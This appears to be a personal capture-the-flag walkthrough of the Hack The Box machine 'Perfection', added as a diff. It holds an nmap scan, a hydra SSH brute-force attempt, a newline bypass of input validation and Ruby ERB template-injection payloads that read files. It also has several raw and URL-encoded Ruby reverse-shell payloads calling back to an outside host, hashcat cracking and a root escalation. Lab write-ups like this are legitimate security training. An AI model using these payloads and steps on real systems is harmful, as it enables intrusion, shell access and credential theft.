@@ -1,0 +1,297 @@
+2024-04-09 Tue 01:52 PM IP given 10.10.11.253
+2024-04-09 Tue 01:52 PM (nmap 10.10.11.253) blocked - running with (nmap -Pn
+10.10.11.253) to bypass discovery phase... this may take a minute.
+2024-04-09 Tue 02:11 PM was still running 20 minutes later. running with
+addition of -F to check only for standard ports. This shows that we are running
+ssh and http
+
+2024-04-09 Tue 02:12 PM Can we curl? (curl 10.10.11.253:80)
+2024-04-09 Tue 02:12 PM Looks like a "Weighted Grade Calculator" page. Let's
+navigate to it. Taking a while...
+
+2024-04-09 Tue 02:14 PM Running dirsearch while that loads (dirsearch
+10.10.11.253)
+2024-04-09 Tue 02:16 PM /weighted-grade url yields a calculator tool that
+allows for free text in subject field. Let's use BurpSuite and see what we can
+see. When we make a post, it actually sends the post to /weighted-grade-calc
+but doesn't seem to complete. Let's try it in the repeater.
+
+2024-04-09 Tue 02:19 PM This returns a 200 with a calculation of the weighted
+grade. Let's play with injection and see if we can see anything.
+
+2024-04-09 Tue 02:23 PM If we run with the input of "category" as <img
+src="10.10.14.33:8001"> we get a "Malicious input blocked" response. Can we
+play with any other fields? User-agent?
+
+2024-04-09 Tue 02:39 PM None of the other XSS did anything... but wait, if we
+(curl 10.10.11.253/weighted-grade-calc) we get an interesting result:
+<!DOCTYPE html>
+<html>
+<head>
+  <style type="text/css">
+  body { text-align:center;font-family:helvetica,arial;font-size:22px;
+    color:#888;margin:20px}
+  #c {margin:0 auto;width:500px;text-align:left}
+  </style>
+</head>
+<body>
+  <h2>Sinatra doesn’t know this ditty.</h2>
+  <img src='http://127.0.0.1:3000/__sinatra__/404.png'>
+  <div id="c">
+    Try this:
+    <pre>get &#x27;&#x2F;weighted-grade-calc&#x27; do
+  &quot;Hello World&quot;
+end
+</pre>
+  </div>
+</body>
+</html>
+
+2024-04-09 Tue 02:47 PM Trying dirsearch again to see if we can find anything,
+but keep getting a "too many requests" error
+
+
+2024-04-09 Tue 02:49 PM Wonder if we can try to ssh into the box: (hydra -L
+Downloads/common_usernames.txt -p /usr/share/wordlists/rockyou.txt
+ssh://10.10.11.253) no dice
+2024-04-09 Tue 03:04 PM Going to try using possible username "tina" given about
+page
+2024-04-09 Tue 03:21 PM After reviewing the about page again, realized that
+"susan" is listed as a sysadmin
+
+2024-04-09 Tue 02:55 PM Re-running dirsearch with rate limit of 20 requests per
+second to see if this helps (dirsearch -u http://10.10.11.253:80 --max-rate=20)
+2024-04-09 Tue 03:02 PM Still no luck - trying with gobuster instead: (gobuster
+dir -u http://10.10.11.253:80 -w
+/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt)
+2024-04-09 Tue 03:09 PM The server keeps crashing...
+
+
+2024-04-09 Tue 03:15 PM This is admittedly where I went for a hint and found
+the hint to use URL encoding on the malicious input.
+2024-04-09 Tue 03:34 PM The hint I found included the fact that a newline can
+sometimes be included at the beginning of an input to bypass validation.
+
+2024-04-09 Tue 03:51 PM URL encoding an image tag <img
+src="http:/10.10.14.33:80" just put the image tag onto the page, but didn't
+actually reach out to the server
+2024-04-09 Tue 03:52 PM Looked up how we can leverage embedding random HTML to
+uncover information about the file system
+2024-04-09 Tue 03:55 PM SSTI - leverage the fact that they might be using Jinja
+or another templating service. This seems like the right track?
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md
+Shows some templates for Jinja. I feel like Jinja is going to be the most
+common so let's start there.
+2024-04-09 Tue 03:57 PM URL encoding a newline, then {{config.items()}} 
+
+(afk appointment)
+
+2024-04-09 Tue 05:38 PM That did not work, so no Jinja. Ruby? I'm not familiar,
+but there are Ruby examples in that README. Let's try <%= Dir.entries('/') %> 
+2024-04-09 Tue 05:41 PM THAT WORKED!!! 
+["dev", "libx32", "srv", "lib", "usr", "bin", "lib64", "lost+found", "sys", "var", "media", "tmp", "proc", "boot", "home", "opt", "lib32", "sbin", "run", "etc", "mnt", "..", "root", "."]
+
+2024-04-09 Tue 05:42 PM If we do 
+<%= Dir.entries('/home') %> we see 
+["susan", "..", "."]:
+So we were correct about susan being the owner of the acct. 
+
+2024-04-09 Tue 05:43 PM <%= Dir.entries('/home/susan') %> 
+[".vimrc", ".bash_logout", "linpeas.sh", "user.txt", ".lesshst", ".sqlite_history", "Migration", ".bashrc", ".python_history", ".profile", ".sudo_as_admin_successful", ".gnupg", ".local", "ruby_app", "..", ".bash_history", ".cache", "."]
+
+2024-04-09 Tue 05:44 PM We'll want to check out that user.txt file. Not sure
+how to cat a file in Ruby...
+2024-04-09 Tue 05:46 PM <%= File.read("/home/susan/user.txt") %>
+2024-04-09 Tue 05:49 PM Yeehaw :) flag: ef7155de2994716ea61f75af499c35ed
+
+2024-04-09 Tue 05:50 PM For the root flag, there is a lot of good stuff in
+Susan's directory that we'll dig into next
+
+(afk)
+
+2024-04-09 Tue 07:12 PM Back, let's remember what Susan has going on in her
+home directory.
+2024-04-09 Tue 07:13 PM First let's checkout the history files
+SQL: 
+payload: %0A%3C%25%3D%20File.read%28%22%2Fhome%2Fsusan%2F.sqlite_history%22%29%20%25%3E%0A
+result:
+... we cannot read the history files. Let's figure out how to figure out what
+we can read. We'll want to run (sudo -l) to sort out what can be run by the
+server. It looks like in Ruby we can use the system() method: system("sudo -l")
+payload: %0A%3C%25%3D%20system%28%22sudo%20-l%22%29%20%25%3E%0A
+result: "false"
+2024-04-09 Tue 07:18 PM What does it mean if sudo -l returns false? Searching
+online: "When the system method in Ruby returns false, it means the command was
+executed in a subshell but it exited with a non-zero status, indicating
+failure."
+2024-04-09 Tue 07:20 PM Let's go back to looking at the files in Susan's dir.
+Perhaps the bash script will tell us something. 
+payload: %0A%3C%25%3D%20File.read%28%22%2Fhome%2Fsusan%2Flinpeas.sh%22%20%25%3E%0A
+Whoa, just printing it throws a 500 server error. ... Because I forgot the end
+parens
+2024-04-09 Tue 07:30 PM Take two
+payload: %0A%3C%25%3D%20File.read%28%22%2Fhome%2Fsusan%2Flinpeas.sh%22%29%20%25%3E%0A
+result: (too big, stored in linpeas.sh in this directory)
+2024-04-09 Tue 07:32 PM This file seems to be a huge script for recon on
+a server. Susan is up to something. We'll want to run it, so we should get
+a reverse shell going if we can.
+
+REVERSE SHELL
+2024-04-09 Tue 07:33 PM Running (nc -lvnp 1234) locally
+2024-04-09 Tue 07:33 PM I'm not familiar enough with Ruby to know off the bat
+how to pop a shell, but if we know that we have the system() call at our
+disposal, we can try a classic payload in there.
+payload: (unencoded) <% system("nc 10.10.14.33 1234 -e /bin/bash") %>
+2024-04-09 Tue 07:38 PM No luck. Found some resources at https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
+payload: <% system("f=TCPSocket.open("10.0.0.1",1234).to_i;exec
+sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)" %>
+encoded payload: %0A%3C%25%20system%28%22f%3DTCPSocket.open%28%2210.0.0.1%22%2C1234%29.to_i%3Bexec%20sprintf%28%22%2Fbin%2Fsh%20-i%20%3C%26%25d%20%3E%26%25d%202%3E%26%25d%22%2Cf%2Cf%2Cf%29%22%20%25%3E%0A%0A%0A
+(it helps if you set it to the right IP!)
+new encoded payload: %0A%3C%25%20system%28%22f%3DTCPSocket.open%28%2210.10.14.33%22%2C1234%29.to_i%3Bexec%20sprintf%28%22%2Fbin%2Fsh%20-i%20%3C%26%25d%20%3E%26%25d%202%3E%26%25d%22%2Cf%2Cf%2Cf%29%22%20%25%3E%0A%0A%0A
+2024-04-09 Tue 07:41 PM That yielded a 500, which is what happened before when
+there was a Ruby error. Maybe we need to require the socket library?
+payload: <% system("require 'socket';f=TCPSocket.open("10.10.14.33",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)" %>
+encoded payload: %0A%3C%25%20system%28%22require%20%27socket%27%3Bf%3DTCPSocket.open%28%2210.10.14.33%22%2C1234%29.to_i%3Bexec%20sprintf%28%22%2Fbin%2Fsh%20-i%20%3C%26%25d%20%3E%26%25d%202%3E%26%25d%22%2Cf%2Cf%2Cf%29%22%20%25%3E%0A%0A%0A
+2024-04-09 Tue 07:43 PM it's thinking...
+2024-04-09 Tue 07:46 PM Another 500 server error. 
+2024-04-09 Tue 07:47 PM Let's try another one liner:
+https://stackoverflow.com/questions/52062703/ruby-one-liner-breakdown This one
+looks different in that it waits as long as the connection is open and
+continuously sends data. It also looks like this puts the port in quotes. That
+might have been an issue as well.
+
+2024-04-09 Tue 07:48 PM 
+Payload: 
+<% system("require 'socket';c=TCPSocket.new('10.10.14.33','1234');while(cmd=c.gets);IO.popen(cmd,'r'){|io|c.print io.read}end" %>
+Encoded payload: %0A%3C%25%20system%28%22require%20%27socket%27%3Bc%3DTCPSocket.new%28%2710.10.14.33%27%2C%271234%27%29%3Bwhile%28cmd%3Dc.gets%29%3BIO.popen%28cmd%2C%27r%27%29%7B%7Cio%7Cc.print%20io.read%7Dend%22%20%25%3E
+Still yields a 500
+2024-04-09 Tue 07:52 PM After reading more about Ruby's system call, it looks
+like eval is what we want instead, as this can handle dynamic content 
+Payload:
+<% eval("require 'socket';c=TCPSocket.new('10.10.14.33','1234');while(cmd=c.gets);IO.popen(cmd,'r'){|io|c.print io.read}end" %>
+Encoded payload:
+%0A%3C%25%20system%28%22require%20%27socket%27%3Bc%3DTCPSocket.new%28%2710.10.14.33%27%2C%271234%27%29%3Bwhile%28cmd%3Dc.gets%29%3BIO.popen%28cmd%2C%27r%27%29%7B%7Cio%7Cc.print%20io.read%7Dend%22%20%25%3E%0A%0A%0A
+2024-04-09 Tue 07:54 PM Still an error. Let's wrap this in a try catch maybe,
+so we can get an informative error printed out.
+
+2024-04-09 Tue 07:58 PM Realized a few things.
+1. we can use begin/end tags for a try catch equivalent
+2. I didn't have an end paren on that last one, so it might still work.
+3. Looking at the originally linked example of a Ruby payload, I realized at
+   some point I lost the = in the <%= and that probably matters.
+4. The 'require' bit is shown in some examples as being in a separate section,
+   like so
+<% require 'socket' %><%= code;here; %>
+
+Putting this all together for another attempt...
+payload:
+
+<%= begin %>
+<% require 'socket' %><%= eval("c=TCPSocket.new('10.10.14.33','1234');while(cmd=c.gets);IO.popen(cmd,'r'){|io|c.print io.read}end") %>
+<%= rescue => e %>
+<%= e %>
+<%= end %>
+
+2024-04-09 Tue 08:02 PM That also didn't work. Maybe the new error handling
+code is causing problems. Let's try just the following.
+payload: 
+<% require 'socket' %><%= eval("c=TCPSocket.new('10.10.14.33','1234');while(cmd=c.gets);IO.popen(cmd,'r'){|io|c.print io.read}end") %>
+encoded payload: %0A%3C%25%20require%20%27socket%27%20%25%3E%3C%25%3D%20eval%28%22c%3DTCPSocket.new%28%2710.10.14.33%27%2C%271234%27%29%3Bwhile%28cmd%3Dc.gets%29%3BIO.popen%28cmd%2C%27r%27%29%7B%7Cio%7Cc.print%20io.read%7Dend%22%29%20%25%3E%0A%0A
+
+2024-04-09 Tue 08:03 PM THAT WORKED!!! We have a shell, but it seems to
+exclusively be inside the ruby_app folder, which I cannot exit. 
+
+
+2024-04-10 Wed 09:40 AM Found SQL file pupilpath_credentials.db in findings
+file
+
+2024-04-10 Wed 09:42 AM Hash(?) In the SQL file?
+abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f might be MD5?
+No it's 64 chars, so probably SHA2256.
+2024-04-10 Wed 09:44 AM Saving to ./hash.txt and running hashcat
+cmd: hashcat -m 1400 -a 3 hash.txt /usr/share/wordlists/rockyou.txt
+2024-04-10 Wed 09:55 AM That may take a while. Poking around more at files. 
+$ cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+pollinate:x:105:1::/var/cache/pollinate:/bin/false
+sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
+syslog:x:107:113::/home/syslog:/usr/sbin/nologin
+uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
+tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
+tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
+landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
+fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
+usbmux:x:113:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
+lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
+susan:x:1001:1001:Susan Miller,,,:/home/susan:/bin/bash
+_laurel:x:998:998::/var/log/laurel:/bin/false
+
+This^ also gives us Susan's full name, if we hadn't been able to get it from
+the website.
+
+2024-04-10 Wed 10:05 AM hashcat still very slow - running with john the ripper
+pass list instead?
+hashcat -m 1400 -a 3 -w 3 hash.txt /usr/share/john/password.lst 
+
+2024-04-10 Wed 10:14 AM No luck there. This is where I went for another hint,
+to check out the /var/mail folder. This shows us an email sent Tina to Susan
+telling her to change her password to {firstname}_{first name backwards}_{random digit
+between 1 and 1,000,000,000} ... classic. Now we should be able to crack it.
+
+2024-04-10 Wed 10:16 AM We can now format our input to hashcat as follows 
+cmds:
+hashcat -m 1400 -a 3 hash.txt 'susan_nasus_?d'
+hashcat -m 1400 -a 3 hash.txt 'susan_nasus_?d?d'
+hashcat -m 1400 -a 3 hash.txt 'susan_nasus_?d?d?d'
+hashcat -m 1400 -a 3 hash.txt 'susan_nasus_?d?d?d?d'
+hashcat -m 1400 -a 3 hash.txt 'susan_nasus_?d?d?d?d?d'
+hashcat -m 1400 -a 3 hash.txt 'susan_nasus_?d?d?d?d?d?d'
+etc
+
+Hooray! hashcat -m 1400 -a 3 hash.txt 'susan_nasus_?d?d?d?d?d?d?d?d?d' yields:
+abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f:susan_nasus_413759210
+
+2024-04-10 Wed 10:36 AM We cannot seem to run sudo su from the shell we have.
+But thinking back to the original nmap, the server can be ssh'd into. We know
+username: susan
+password: susan_nasus_413759210
+
+2024-04-10 Wed 10:37 AM Run (ssh susan@10.10.11.253)
+SUCCESS!
+susan@perfection:~$ sudo su
+[sudo] password for susan: 
+root@perfection:/home/susan# 
+root@perfection:/# find * -name "root.txt"
+root/root.txt
+^C
+root@perfection:/# cat root/root.txt
+35c6a762f96794180d742cd557a52d49
+
+
+LEARNINGS:
+- newline at front of input can bypass validation
+- don't forget about URL encoding
+- Server-Side Template Injection (SSTI)
+  - If the web application uses a server-side templating engine (like Jinja2, ERB, or Twig), and you can exploit an SSTI vulnerability, you might be able to inject template syntax that could read server files. This would not be through HTML directly but through the server-side processing of injected template commands.
